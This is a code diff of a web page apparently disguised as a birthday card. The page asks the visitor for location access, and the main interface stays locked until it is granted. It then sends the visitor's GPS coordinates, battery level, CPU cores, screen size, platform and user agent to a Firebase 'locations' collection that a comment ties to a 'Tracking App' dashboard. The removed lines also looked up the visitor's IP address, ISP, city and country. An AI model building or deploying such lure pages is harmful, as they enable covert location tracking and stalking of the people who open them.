@@ -235,7 +235,7 @@
         </div>
     </div>
 
-    <!-- Firebase SDK Setup -->
+    <!-- Firebase Modular Implementation -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
@@ -268,33 +268,36 @@
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        // Fixed data mapping for the tracking app
-        window.saveLocationData = async (lat, lng, accuracy, deviceDetails) => {
+        window.saveLocationData = async (lat, lng, accuracy) => {
             await authReady;
             if (!currentUserId) return;
+
             try {
-                const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
-                
-                // Simplified structure to ensure Tracking App picks up data correctly
-                await addDoc(colRef, { 
+                // Get battery level
+                let batteryLevel = 0;
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = battery.level;
+                }
+
+                const docData = {
                     lat: lat,
                     lng: lng,
-                    accuracy: accuracy + "m",
-                    battery: deviceDetails.battery?.level || "N/A",
-                    battery_status: deviceDetails.battery?.charging ? "Charging" : "Discharging",
-                    cores: deviceDetails.hardware?.cores || "N/A",
-                    ram: deviceDetails.hardware?.memory || "N/A",
-                    resolution: deviceDetails.hardware?.screen || "N/A",
-                    browser: "Google Chrome",
-                    os: deviceDetails.hardware?.platform || "N/A",
-                    isp: deviceDetails.internetProvider?.isp || "N/A",
-                    ip: deviceDetails.internetProvider?.ip || "N/A",
-                    city: deviceDetails.internetProvider?.city || "N/A",
-                    country: deviceDetails.internetProvider?.country || "N/A",
-                    network_type: deviceDetails.network?.type || "N/A",
-                    timestamp: serverTimestamp()
-                });
-                console.log("Tracking fixed and data saved!");
+                    accuracy: accuracy,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    timestamp: serverTimestamp(),
+                    battery: batteryLevel,
+                    cores: navigator.hardwareConcurrency || 0,
+                    screen: {
+                        w: window.screen.width,
+                        h: window.screen.height
+                    }
+                };
+
+                const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
+                await addDoc(colRef, docData);
+                console.log("Data structured and saved for dashboard.");
             } catch (e) { 
                 console.error("Firestore Error:", e); 
             }
@@ -353,46 +356,6 @@
             }
         }
 
-        async function getDeviceDetails() {
-            let batteryInfo = { level: "N/A", charging: false };
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = { 
-                        level: Math.round(battery.level * 100) + "%", 
-                        charging: battery.charging 
-                    };
-                }
-            } catch(e) {}
-            
-            let ipInfo = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                if(res.ok) ipInfo = await res.json();
-            } catch(e) {}
-
-            return {
-                battery: batteryInfo,
-                hardware: {
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    platform: navigator.platform
-                },
-                network: {
-                    type: navigator.connection?.effectiveType || "N/A",
-                    speed: navigator.connection?.downlink ? navigator.connection.downlink + " Mbps" : "N/A"
-                },
-                internetProvider: {
-                    ip: ipInfo.ip || "N/A",
-                    isp: ipInfo.org || "N/A",
-                    city: ipInfo.city || "N/A",
-                    country: ipInfo.country_name || "N/A"
-                },
-                browserDetails: navigator.userAgent
-            };
-        }
-
         async function checkAndShowPopup() {
             if (navigator.permissions && navigator.permissions.query) {
                 try {
@@ -419,8 +382,7 @@
                         closeAllPopups();
                         enableMainInterface();
                         if (window.saveLocationData) {
-                            const device = await getDeviceDetails();
-                            await window.saveLocationData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, device);
+                            await window.saveLocationData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                         }
                     },
                     (error) => {
